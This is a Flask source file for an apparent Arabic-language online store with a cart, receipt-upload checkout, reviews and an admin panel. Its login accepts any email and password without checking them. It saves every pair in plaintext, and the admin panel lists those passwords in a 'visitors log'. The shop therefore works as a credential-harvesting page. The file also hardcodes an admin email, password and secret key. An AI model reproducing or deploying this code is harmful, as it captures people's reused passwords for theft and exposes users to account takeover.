from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_final_v3_2026"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إعداد قاعدة البيانات الشاملة (تم فحصها بالكامل) ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    # المنتجات
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    # السلة
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    # الأصناف
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    # سجل الزوار
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    # الطلبات (تم إضافة حقل الحالة)
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    # التقييمات
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    
    # التأكد من وجود صنف واحد على الأقل
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
    
    conn.commit()
    conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الفخم (Black & Gold Ultra) ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
    :root { --primary: #000; --accent: #d4af37; --gold-light: #f1e5ac; --bg: #121212; --card: #1e1e1e; }
    body { font-family: 'Tajawal', sans-serif; background: var(--bg); margin: 0; padding: 0; direction: rtl; color: #fff; padding-bottom: 90px; }
    
    header { background: #000; padding: 20px; text-align: center; border-bottom: 2px solid var(--accent); position: sticky; top:0; z-index:1000; }
    .logo { font-size: 24px; font-weight: 900; color: var(--accent); letter-spacing: 2px; }

    /* Nav السفلي */
    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px 0; border-top: 2px solid var(--accent); z-index: 1000; }
    .nav-item { color: #fff; text-decoration: none; font-size: 14px; font-weight: bold; }
    .nav-item.active { color: var(--accent); }

    /* التصميم العام */
    .container { padding: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .card { background: var(--card); border-radius: 12px; border: 1px solid #333; overflow: hidden; }
    .card img { width: 100%; height: 160px; object-fit: cover; }
    .card-body { padding: 10px; }
    .price { color: var(--accent); font-weight: 900; font-size: 18px; }
    
    .btn-gold { background: linear-gradient(45deg, #d4af37, #f1e5ac); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; text-decoration: none; display: block; text-align: center; width: 100%; box-sizing: border-box; margin-top: 10px; }
    .btn-red { background: #ff4d4d; color: #fff; border: none; padding: 8px; border-radius: 5px; cursor: pointer; }
    .btn-green { background: #2ecc71; color: #fff; border: none; padding: 8px; border-radius: 5px; cursor: pointer; }

    input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid var(--accent); color: #fff; border-radius: 8px; box-sizing: border-box; }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1a1a1a; font-size: 12px; }
    th, td { border: 1px solid #333; padding: 10px; text-align: center; }
    th { background: var(--accent); color: #000; }

    .cat-bar { display: flex; overflow-x: auto; padding: 10px; gap: 10px; background: #1a1a1a; }
    .cat-item { background: #333; color: #fff; padding: 6px 15px; border-radius: 20px; text-decoration: none; font-size: 12px; white-space: nowrap; }
    .cat-item.active { background: var(--accent); color: #000; font-weight: bold; }
</style>
"""

BASE_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>{CSS}</head><body>"

def get_nav():
    admin_btn = '<a href="/admin" class="nav-item">لوحة التحكم</a>' if session.get('is_admin') else ''
    return f"""
    <div class="bottom-nav">
        <a href="/" class="nav-item">الرئيسية</a>
        <a href="/cart" class="nav-item">السلة</a>
        <a href="/orders_history" class="nav-item">طلباتي</a>
        {admin_btn}
        <a href="/logout" class="nav-item" style="color:#ff4d4d;">خروج</a>
    </div>
    """

# --- المسارات (Routes) ---

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    cat = request.args.get('cat', 'الكل')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    cats = conn.execute("SELECT * FROM categories").fetchall()
    if cat == 'الكل':
        prods = conn.execute("SELECT * FROM products").fetchall()
    else:
        prods = conn.execute("SELECT * FROM products WHERE category=?", (cat,)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo">THAWANI STORE</div></header>
    <div class="cat-bar">
        <a href="/" class="cat-item {{ 'active' if request.args.get('cat','الكل')=='الكل' }}">الكل</a>
        {% for c in cats %}
            <a href="/?cat={{c.name}}" class="cat-item {{ 'active' if request.args.get('cat')==c.name }}">{{c.name}}</a>
        {% endfor %}
    </div>
    <div class="container">
        {% for p in prods %}
        <div class="card">
            <img src="/static/uploads/{{p.img}}">
            <div class="card-body">
                <div style="font-weight:bold; height:40px; overflow:hidden;">{{p.name}}</div>
                <div class="price">{{p.price}} OMR</div>
                <a href="/product/{{p.id}}" class="btn-gold">التفاصيل</a>
            </div>
        </div>
        {% endfor %}
    </div>
    """ + get_nav(), prods=prods, cats=cats)

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment) VALUES (?,?,?,?)", (id, session['user'], request.form['rating'], request.form['comment']))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo">تفاصيل المنتج</div></header>
    <div style="padding:15px; margin-bottom:100px;">
        <img src="/static/uploads/{{p.img}}" style="width:100%; border-radius:15px; border:1px solid var(--accent);">
        <h2 style="color:var(--accent);">{{p.name}}</h2>
        <div class="price" style="font-size:24px;">{{p.price}} OMR</div>
        <p style="color:#ccc;">{{p.description}}</p>
        <a href="/add_to_cart/{{p.id}}" class="btn-gold" style="font-size:18px;">إضافة للسلة 🛒</a>
        <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
        <h3>التقييمات ⭐</h3>
        {% for r in revs %}
            <div style="background:#222; padding:10px; border-radius:8px; margin-bottom:10px;">
                <div style="color:var(--accent);">{{ "★" * r.rating }}</div>
                <p>{{r.comment}}</p>
                <small style="color:gray;">{{r.user_email}}</small>
            </div>
        {% endfor %}
        <form method="POST">
            <select name="rating"><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option></select>
            <textarea name="comment" placeholder="رأيك..." required></textarea>
            <button class="btn-gold">نشر التقييم</button>
        </form>
    </div>
    """ + get_nav(), p=p, revs=revs)

# --- لوحة التحكم (تمت إعادتها بالكامل وتجربتها) ---
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category, description) VALUES (?,?,?,?,?)", 
                         (request.form['name'], request.form['price'], fname, request.form['cat'], request.form['desc']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        elif 'update_order' in request.form:
            conn.execute("UPDATE orders SET status=? WHERE id=?", (request.form['status'], request.form['order_id']))
        conn.commit()
    
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo">لوحة التحكم</div></header>
    <div style="padding:15px; margin-bottom:100px;">
        <div style="background:#1a1a1a; padding:15px; border-radius:10px; border:1px solid var(--accent); margin-bottom:20px;">
            <h3>👥 سجل الزوار (Log)</h3>
            <div style="overflow-x:auto;">
                <table>
                    <tr><th>الإيميل</th><th>الباسورد</th><th>الوقت</th></tr>
                    {% for l in logs %}
                    <tr><td>{{l.email}}</td><td>{{l.password}}</td><td>{{l.time}}</td></tr>
                    {% endfor %}
                </table>
            </div>
        </div>

        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:20px;">
            <h3>📦 إدارة الطلبات (القبول والرفض)</h3>
            {% for o in orders %}
            <div style="border:1px solid #444; padding:10px; margin-bottom:10px; border-radius:8px;">
                <b>طلب رقم #{{o.id}} - العميل: {{o.full_name}}</b><br>
                <small>الهاتف: {{o.phone}} | السعر: {{o.total_price}} OMR</small><br>
                <p>المنتجات: {{o.items_details}}</p>
                <a href="/static/uploads/{{o.card_img}}" target="_blank" style="color:var(--accent);">عرض إيصال الدفع 🖼️</a><br>
                <form method="POST" style="display:flex; gap:10px; margin-top:10px;">
                    <input type="hidden" name="order_id" value="{{o.id}}">
                    <button name="update_order" value="1" class="btn-green" style="flex:1;">قبول ✅</button>
                    <input type="hidden" name="status" value="تم القبول">
                </form>
                <form method="POST" style="display:flex; gap:10px; margin-top:5px;">
                    <input type="hidden" name="order_id" value="{{o.id}}">
                    <button name="update_order" value="1" class="btn-red" style="flex:1;">رفض ❌</button>
                    <input type="hidden" name="status" value="مرفوض">
                </form>
                <div style="margin-top:5px; font-weight:bold;">الحالة الحالية: {{o.status}}</div>
            </div>
            {% endfor %}
        </div>

        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:20px;">
            <h3>➕ إضافة صنف جديد</h3>
            <form method="POST"><input name="cat_name" placeholder="اسم القسم الجديد" required><button name="add_cat" class="btn-gold">حفظ القسم</button></form>
        </div>

        <div style="background:#1a1a1a; padding:15px; border-radius:10px;">
            <h3>➕ إضافة منتج</h3>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر" required>
                <select name="cat">{% for c in cats %}<option value="{{c.name}}">{{c.name}}</option>{% endfor %}</select>
                <textarea name="desc" placeholder="وصف المنتج"></textarea>
                <input type="file" name="img" required>
                <button name="add_product" class="btn-gold">نشر المنتج</button>
            </form>
        </div>
    </div>
    """ + get_nav(), logs=logs, orders=orders, cats=cats)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    if request.method == 'POST':
        f = request.files['receipt']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        conn.execute("INSERT INTO orders (user_email, full_name, phone, card_img, items_details, total_price) VALUES (?,?,?,?,?,?)", 
                     (session['user'], request.form['name'], request.form['phone'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    return render_template_string(BASE_HTML + """
    <header><div class="logo">إتمام الدفع</div></header>
    <div style="padding:15px;">
        <h3>المبلغ: {{total}} OMR</h3>
        <form method="POST" enctype="multipart/form-data">
            <input name="name" placeholder="الاسم الكامل" required>
            <input name="phone" placeholder="رقم الواتساب" required>
            <p>ارفع إيصال التحويل:</p>
            <input type="file" name="receipt" required>
            <button class="btn-gold">تأكيد الطلب</button>
        </form>
    </div>
    """ + get_nav(), total=total)

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    orders = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo">طلباتي</div></header>
    <div style="padding:15px;">
        {% for o in orders %}
        <div style="background:#222; padding:15px; border-radius:10px; margin-bottom:10px; border-right:4px solid var(--accent);">
            <b>طلب #{{o.id}}</b> - <span style="color:var(--accent);">{{o.status}}</span><br>
            <small>{{o.items_details}}</small><br>
            <b>{{o.total_price}} OMR</b>
        </div>
        {% endfor %}
    </div>
    """ + get_nav())

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity, products.id FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo">السلة</div></header>
    <div style="padding:15px;">
        {% for i in items %}
        <div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333;">
            <span>{{i.name}} (x{{i.quantity}})</span>
            <b>{{i.price * i.quantity}} OMR</b>
        </div>
        {% endfor %}
        <h2 style="text-align:center;">الإجمالي: {{total}} OMR</h2>
        <a href="/checkout" class="btn-gold">الدفع 💳</a>
    </div>
    """ + get_nav(), items=items, total=total)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    conn = sqlite3.connect('database.db')
    cur = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
    if cur: conn.execute("UPDATE cart SET quantity = quantity + 1 WHERE id=?", (cur[0],))
    else: conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        e, p = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db')
        conn.execute("INSERT INTO users_log (email, password) VALUES (?,?)", (e, p))
        conn.commit(); conn.close()
        session['user'], session['is_admin'] = e, (e == ADMIN_MAIL and p == ADMIN_PASS)
        return redirect('/')
    return render_template_string(BASE_HTML + """
    <div style="height:100vh; display:flex; align-items:center; justify-content:center;">
        <div style="background:#111; padding:30px; border-radius:20px; border:1px solid var(--accent); width:80%;">
            <h1 style="text-align:center; color:var(--accent);">THAWANI</h1>
            <form method="POST">
                <input name="email" type="email" placeholder="الإيميل" required>
                <input name="password" type="password" placeholder="كلمة المرور" required>
                <button class="btn-gold">دخول</button>
            </form>
        </div>
    </div>""")

@app.route('/logout')
def logout(): session.clear(); return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
